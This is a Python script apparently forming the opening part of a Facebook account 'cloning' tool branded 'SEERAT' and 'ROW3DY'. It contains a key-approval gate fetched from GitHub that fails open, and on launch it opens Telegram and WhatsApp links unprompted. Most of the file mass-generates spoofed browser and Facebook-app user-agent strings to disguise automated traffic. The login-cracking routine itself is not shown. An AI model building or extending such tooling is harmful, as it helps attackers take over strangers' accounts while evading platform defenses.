#===== SCrIPT modified by Rowedy 

#===== TELIGERM : ROW3DY
#---------------------[ IMPORT ]---------------------#
import os,sys,json,uuid,string,random,requests,urllib3,rich,base64,re
import time
import io
import subprocess
try:
    import pyperclip
except:
    pass

from concurrent.futures import ThreadPoolExecutor as ThreadPool

sys.dont_write_bytecode = True

# ------------------------------
# Simple Key Generator
# ------------------------------
try:
    device = str(os.geteuid())
except:
    device = "UNKNOWN"

try:
    build = subprocess.check_output("getprop ro.build.id", shell=True).decode().strip()
except:
    build = "UNKNOWN"

# Short Key
final_key = "KEY-" + (device + build)[-6:].upper()

# Master Key (always approved)
MASTER_KEY = "VIP-12345"

# Force UTF-8 for stdin
try:
    sys.stdin = io.TextIOWrapper(sys.stdin.buffer, encoding="utf-8", errors="ignore")
except:
    pass

# Colors for Approval System
GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
RESET = "\033[0m"

COLORS = [RED, GREEN, CYAN, YELLOW, MAGENTA]

#---------------------[ LOOP ]---------------------#
loop = 0;oks =[];user=[];ugen=[];uas=[]
#========= [ JONE ]=====
os.system("xdg-open https://t.me/+tpDR8IFCCx8yOGRl")
sys.stdout.write('\x1b]2; ROW3DY 🔥 \x07')

# ------------------------------
# Approval Banners
# ------------------------------
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def shivam_banner():
    clear_screen()
    color = random.choice(COLORS)
    art = f"""{color}{BOLD}
 $$$$$$\  $$$$$$$$\ $$$$$$$$\ $$$$$$$\   $$$$$$\ $$$$$$$$\       
$$  __$$\ $$  _____|$$  _____|$$  __$$\ $$  __$$\\__$$  __|      
$$ /  \__|$$ |      $$ |      $$ |  $$ |$$ /  $$ |  $$ |         
\$$$$$$\  $$$$$\    $$$$$\    $$$$$$$  |$$$$$$$$ |  $$ |         
 \____$$\ $$  __|   $$  __|   $$  __$$< $$  __$$ |  $$ |         
$$\   $$ |$$ |      $$ |      $$ |  $$ |$$ |  $$ |  $$ |         
\$$$$$$  |$$$$$$$$\ $$$$$$$$\ $$ |  $$ |$$ |  $$ |  $$ |         
 \______/ \________|\________|\__|  \__|\__|  \__|  \__|         
                                                                 
                                                                 
                                                                 
{RESET}
{color}{BOLD}👑 SEERAT BRAND ACCESS 👑{RESET}
"""
    print(art)
    print(f"{color}{BOLD}❌ Approval Required to Continue ❌{RESET}\n")

def premium_start_screen():
    clear_screen()
    color = random.choice(COLORS)
    art = f"""{color}{BOLD}
 $$$$$$\  $$$$$$$$\ $$$$$$$$\ $$$$$$$\   $$$$$$\ $$$$$$$$\       
$$  __$$\ $$  _____|$$  _____|$$  __$$\ $$  __$$\\__$$  __|      
$$ /  \__|$$ |      $$ |      $$ |  $$ |$$ /  $$ |  $$ |         
\$$$$$$\  $$$$$\    $$$$$\    $$$$$$$  |$$$$$$$$ |  $$ |         
 \____$$\ $$  __|   $$  __|   $$  __$$< $$  __$$ |  $$ |         
$$\   $$ |$$ |      $$ |      $$ |  $$ |$$ |  $$ |  $$ |         
\$$$$$$  |$$$$$$$$\ $$$$$$$$\ $$ |  $$ |$$ |  $$ |  $$ |         
 \______/ \________|\________|\__|  \__|\__|  \__|  \__|         
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
{RESET}
{color}{BOLD}👑 SEERAT BRAND CLONING TOOL 🖤🦅 THANKS FOR CONNECTING US{RESET}
"""
    print(art)
    print(f"{GREEN}╔══════════════════════════════════════╗{RESET}")
    print(f"{GREEN}║ 🛡️ PREMIUM ACCESS GRANTED SUCCESS 🔑 ║{RESET}")
    print(f"{GREEN}║    SEERAT AUTO CLONING TOOL READY    ║{RESET}")
    print(f"{GREEN}╚══════════════════════════════════════╝{RESET}\n")
    time.sleep(2)

# ------------------------------
# Stylish Box Printers
# ------------------------------
def success_box(msg):
    print(f"{GREEN}╔══════════════════════════════╗{RESET}")
    print(f"{GREEN}║   ✅ {msg}{RESET}")
    print(f"{GREEN}╚══════════════════════════════╝{RESET}")

def fail_box(msg):
    print(f"{RED}╔══════════════════════════════╗{RESET}")
    print(f"{RED}║   ❌ {msg}{RESET}")
    print(f"{RED}╚══════════════════════════════╝{RESET}")

def warn_box(msg):
    print(f"{YELLOW}╔══════════════════════════════╗{RESET}")
    print(f"{YELLOW}║   ⚠️ {msg}{RESET}")
    print(f"{YELLOW}╚══════════════════════════════╝{RESET}")

# ------------------------------
# Approval System
# ------------------------------
def approval_check_online():
    print(f"\n{CYAN}╔══════════════════════════════╗{RESET}")
    print(f"{CYAN}║   🔑 Your Device Key: {YELLOW}{final_key}{RESET}")
    print(f"{CYAN}╚══════════════════════════════╝{RESET}\n")

    # ✅ Direct pass for master key
    if final_key == MASTER_KEY:
        success_box("Master Key Detected! Always Approved 🎉")
        return True

    try:
        url = "https://raw.githubusercontent.com/Rowedy413/Rowedyfireold/main/appro.txt"
        response = requests.get(url, timeout=10)

        if response.status_code != 200:
            url = "https://gist.githubusercontent.com/Rowedy413/raw/appro.txt"
            response = requests.get(url, timeout=10)

        if response.status_code == 200:
            approved_keys = [line.strip() for line in response.text.splitlines() if line.strip()]

            partial_match = any(final_key in key for key in approved_keys if "KEY-" in key)

            if final_key in approved_keys or partial_match:
                success_box("Approval Successful! 😎")
                return True
            else:
                fail_box("Your Key is not Approved 💔")
                user_name = input("\n💡 Enter your name: ").strip()
                message = f" Hello Seerat Brand Mam \nMy name is {user_name}\nPlease approve my key:\n🔑 {final_key}"
                try:
                    pyperclip.copy(message)
                    print(f"{MAGENTA}📋 Message copied to clipboard!{RESET}")
                except:
                    pass
                whatsapp_url = f"https://wa.me/919234735585?text={requests.utils.quote(message)}"
                try:
                    os.system(f'termux-open "{whatsapp_url}"')
                except:
                    try:
                        os.system(f'xdg-open "{whatsapp_url}"')
                    except:
                        print(f"{YELLOW}📱 Open WhatsApp and send this message:{RESET}")
                        print(f"{CYAN}{message}{RESET}")
                print(f"\n{RED}❌ Access denied. Please contact admin for approval.{RESET}")
                return False
        else:
            warn_box(f"Failed to fetch approval list (Status {response.status_code})")
            print(f"{YELLOW}⚠️  Continuing in offline mode...{RESET}")
            time.sleep(2)
            return True

    except Exception as e:
        warn_box(f"Connection error: {e}")
        print(f"{YELLOW}⚠️  Continuing in offline mode...{RESET}")
        time.sleep(2)
        return True

#---------------------[ USER AGENT ]---------------------#
rr = random.randint
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P1000CWAXSA','GT-P1010'])
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
for xtd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for sat in range(1000):
	a='NokiaX'
	b=random.randrange(1,9)
	c='-0'
	d=random.randrange(1,9)
	e='/'
	f=random.randrange(1,9)
	g='.0 ('
	h=random.randrange(1,12)
	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
	j='UNTRUSTED/'
	k=random.randrange(1,3)
	l='.0'
	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
	ugen.append(uaku2)
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakua)
ugen=['Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-G339V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4649.67 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-K74F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4866.45 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-U523I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4306.62 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-K714H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4406.132 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7;  en-us; GT-X34B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4787.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7;  en-us; GT-A279K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4311.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-L795J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4851.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-M695D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4461.114 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-S991J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4581.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-Q267W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4657.41 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-Z770V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4820.52 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 3;  en-us; GT-H919U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4205.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-P333F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4278.48 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-D773O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4266.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-I451H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4291.85 Mobile Safari/537.36']
for i in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    uaku2 = str(rc([satu,dua,tiga,empat]))
    ugen.append(uaku2)
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J610G Build/PPR1.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-G610M Build/PKQ1.{str(rr(111111,210000))}.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2109 Build/RKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/PKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    voda = random.choice([u1, u2, u3, u4, u5])
    ugen.append(voda)
for ggytggd in range(10000):
    x1="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5615.199 Safari/537.36",
    x2="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5; rv:121.0esr) Gecko/20000101 Firefox/121.0esr",
    x3="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5664.210 Safari/537.36",
    x4="Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.195 Safari/537.36 Edg/113.0.1672.58",
    x5="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5621.225 Safari/537.36",
    x6="Mozilla/5.0 (Android 9.2; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0",
    x7="Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/627.7 (KHTML, like Gecko) Version/11.3 Mobile/62UYEW Safari/627.7",
    x8="Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5666.206 Safari/537.36",
    x9="Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/600.5.22 (KHTML, like Gecko) Version/14.6.25 Mobile/FP2ZBT Safari/630.7",
    x10="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20010101 Firefox/118.0/YYRH9jNan3-49",
    x11="Mozilla/5.0 (Android; Mobile; rv:114.0esr) Gecko/114.0esr Firefox/114.0esr",
    x12="Mozilla/5.0 (X11; U; Linux x86_64) Gecko/20102901 Firefox/115.0",
    x13="Mozilla/5.0 (Linux; Android 11; MRX-W09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5656.198 Mobile Safari/537.36",
    x14="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5661.219 Safari/537.36",
    x15="Mozilla/5.0 (Android 10; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    x16="Mozilla/5.0 (X11; U; Linux x86_64) Gecko/20100911 Firefox/112.0",
    x17="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5628.220 Safari/537.36 Edg/111.0.1704.37",
    x18="Mozilla/5.0 (Android 9.3; Tablet; rv:118.0) Gecko/118.0 Firefox/118.0",
    x19="Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/626.36.14 (KHTML, like Gecko) Version/11.2.31 Mobile/25N8NJ Safari/626.36.14",
    x20="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.201 Safari/537.36",
    ff=(x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,x16,x17,x18,x19,x20)
    ugen.append(ff)
for ggytggd in range(10000):
    x1="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5630.196 Safari/537.36",
    x2="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5641.198 Safari/537.36",
    x3="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5631.209 Safari/537.36",
    x4="Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/615.22 (KHTML, like Gecko) Version/11.2.41 Mobile/94CPLG Safari/615.22",
    x5="Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/617.34 (KHTML, like Gecko) Version/10.4 Mobile/F8LQRA Safari/617.34",
    x6="Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5646.198 Safari/537.36",
    x7="Mozilla/5.0 (Linux; Android 9; SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5626.223 Mobile Safari/537.36",
    x8="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5621.203 Safari/537.36",
    x9="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5651.200 Safari/537.36",
    x10="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5634.219 Safari/537.36 OPR/96.0.3512.153",
    x11="Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5625.210 Safari/537.36",
    x12="Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5652.205 Safari/537.36",
    x13="Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5650.226 Safari/537.36 Edg/112.0.1710.61",
    x14="Mozilla/5.0 (X11; U; Linux x86_64; rv:120.0) Gecko/20102109 Firefox/120.0",
    x15="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5659.204 Safari/537.36 Edg/111.0.1720.56",
    x16="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5647.213 Safari/537.36",
    x17="Mozilla/5.0 (X11; Linux x86_64; en-US) Gecko/20070614 Firefox/111.0",
    x18="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5653.215 Safari/537.36 Edg/112.0.1683.36",
    x19="Mozilla/5.0 (Android 10.4; Tablet; rv:121.0) Gecko/121.0 Firefox/121.0",
    x20="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.210 Safari/537.36",
    x21="Mozilla/5.0 (Android 9.2; Mobile; rv:115.0esr) Gecko/115.0esr Firefox/115.0esrMozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5670.211 Safari/537.36",
    x22="Mozilla/5.0 (Windows NT 10.0; Win64; rv:117.0) Gecko/20010101 Firefox/117.0",
    x23="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5646.219 Safari/537.36",
    x24="Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5619.222 Safari/537.36",
    x25="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:115.0) Gecko/20100101 Firefox/115.0/O03JPftRwK6db",
    x26="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5648.207 Safari/537.36 OPR/96.0.4323.135",
    x27="Mozilla/5.0 (Linux; Android 10; SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5646.224 Mobile Safari/537.36",
    x28="Mozilla/5.0 (Linux; Android 9; SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5642.219 Mobile Safari/537.36",
    x29="Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:118.0) Gecko/20162211 Firefox/118.0",
    x30="Mozilla/5.0 (Macintosh; Intel Mac OS X 11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5644.203 Safari/537.36",
    x31="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5666.221 Safari/537.36",
    x32="Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/113.0.5624.224 Chrome/113.0.5624.224 Safari/537.36",
    x33="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5636.197 Safari/537.36",
    x34="Mozilla/5.0 (Linux; Android 10; SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5639.198 Mobile Safari/537.36",
    x35="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5639.211 Safari/537.36",
    ff=(x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,x16,x17,x18,x19,x20,x21,x22,x23,x24,x25,x26,x27,x28,x29,x30,x31,x32,x33,x34,x35)
    ugen.append(ff)
for ggyggd in range(100000):
    x1="Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    ff=(x1)
    ugen.append(ff)
for txt in range (10000):
        a='Mozilla/5.0 (Linux; Android'
        b=random.choice(['9','10','11','12','13','14','15'])
        c='Infinix X6816 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
        d=random.randrange(40,115)
        e='0'
        f=random.randrange(3000,6000)
        g=random.randrange(20,100)
        h='Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/353.0.0.5.112;]'
        ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
        ugen.append(ffg)
for txxxtt in range (10000):
        a='Mozilla/5.0 (Linux; Android'
        b=random.choice(['9','10','11','12','13','14','15'])
        c='Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        d=random.randrange(40,115)
        e='0'
        f=random.randrange(3000,6000)
        g=random.randrange(20,100)
        h='Mobile Safari/537.36'
        ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
        ugen.append(ffg)
for txrelmet in range (10000):
        a='Mozilla/5.0 (Linux; Android'
        b=random.choice(['9','10','11','12','13','14','15'])
        c='RMX3081 Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
        d=random.randrange(40,115)
        e='0'
        f=random.randrange(3000,6000)
        g=random.randrange(20,100)
        h='Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/294.0.0.12.118;]'
        ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
        ugen.append(ffg)
